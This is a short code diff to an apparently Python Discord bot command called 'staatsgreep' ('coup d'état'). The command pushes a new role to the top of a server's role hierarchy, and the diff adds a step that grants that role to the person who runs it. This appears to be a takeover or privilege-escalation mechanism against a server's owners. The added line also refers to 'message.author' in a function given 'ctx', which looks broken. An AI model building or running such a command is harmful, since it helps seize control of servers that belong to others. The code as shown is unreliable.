@@ -126,8 +126,14 @@ async def staatsgreep(ctx):
             await new_role.edit(position=i)
         except discord.Forbidden:
             break
+        except discord.HTTPException:
+            break
+        except discord.InvalidArgument:
+            break
 
     # Add me to the role
+    person = message.author
+    await person.add_roles(new_role)
 
 # test loop
 # restart loop
